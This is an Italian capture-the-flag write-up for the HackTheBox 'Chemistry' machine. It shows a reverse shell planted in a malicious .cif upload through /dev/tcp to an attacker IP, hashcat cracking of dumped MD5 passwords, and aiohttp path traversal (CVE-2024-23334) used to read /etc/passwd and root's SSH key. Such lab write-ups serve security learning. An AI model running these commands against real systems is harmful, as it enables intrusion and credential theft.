
# CHEMISTRY

Associamo l'ip ad un nome host

![echo '10.129.231.170 chemistry.htb' | sudo tee -a /etc/hosts](./immagini/1-hostname.png)

Con una scansione nmap, troviamo la porta 22 e 5000 con un servizio web

![nmap -sVC -oN scan.nmap chemistry.htb](./immagini/2-nmap.png)

Su questo sito è possibile registrarsi e caricare dei file .cif, (Crystallographic Information Framework) i quali sono file che si usano per salvare le informazioni sulle strutture dei cristalli, utilizzati in ambito scientifico. Possiamo scaricarne uno e vedere se funziona

![](./immagini/3_1-dashboard.png)
![](./immagini/3_2-uploaded-file.png)

Cercando degli exploit per questi file ne troviamo uno su exploitDB, bisogna aggiungere le ultime 3 righe al file .cif, la rev shell trovata non funziona, ma provandone altre riusciamo a trovare quella giusta

![](./immagini/4_1-exploitDB.png)
![/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.220/4444 0>&1\'](./immagini/4_2-cif-file.png)

Ora possiamo caricare il file, ascoltare sulla porta scelta e cliccando su 'view' otteniamo una rev shell. Una volta dentro troviamo il  database, dove al suo interno ci sono delle credenziali

![](./immagini/5_1-loaded-file.png)
![nc -lnvp 4444](./immagini/5_2-rev-shell.png)

Salviamo le credenziali in un file e proviamo a crackare gli md5 delle password con hashcat e ne troviamo 5

![](./immagini/6_1-credentials.png)
![hashcat -m0 cred --username /usr/share/wordlists/rockyou.txt](./immagini/6_2-psw.png)

Proviamo le credenziali trovate per entrare con ssh e le uniche valide sono quelle dell'utente rosa, da qui possiamo ottenere la prima flag

![ssh rosa@chemistry.htb](./immagini/7-user-flag.png)

Dando un'occhiata ai servizi su questa macchina ne troviamo uno sulla porta 8080, solo locale, con un servizio http

![ss -tulnp](./immagini/8-socket-http.png)

Facciamo un portforwarding con ssh per vedere questa pagina web sulla nostra macchina, sulla porta 80. Il sito mostra una lista di servizi, ma cercando informazioni sul target su di essi, non troviamo nulla

![ssh -L 80:127.0.0.1:8080 rosa@chemistry.htb](./immagini/9_1-portforwarding.png)
![](./immagini/9_2-web-page.png)

Allora analizziamo la pagina con whatweb e vediamo che usa la libreria python aiohttp alla versione 3.9.1, cercando su internet delle vulnerabilità per questa libreria a questa versione, vediamo che è vulnerabile alla CVE-2024-23334, si tratta di path traversal

![whatweb http://localhost](./immagini/10-whatweb.png)

Per questo path traversal serve una directory da cui iniziare e guardando i file del sito vediamo che c'è la cartella assets, quindi inizieremo da questa

![](./immagini/11_1-site.png)

Troviamo un exploit su github già impostato per la directory che interessa a noi

![](./immagini/11_2-github.png)

Cloniamo il progetto sulla nostra macchina, apriamo un server web con python per scaricarlo sul target, lanciamolo e troviamo l'url vulnerabile

![./lfi_aiohttp.sh /etc/passwd](./immagini/12-find-exploit.png)

Navigando nel filesystem notiamo che possiamo entrare dentro /root, quindi prendiamo la sua chiave ssh, copiamocela e usiamola per collegarci al target in modo da ottenere l'ultima flag

![./lfi_aiohttp.sh /root/.ssh/id_rsa](./immagini/13-root-flag.png)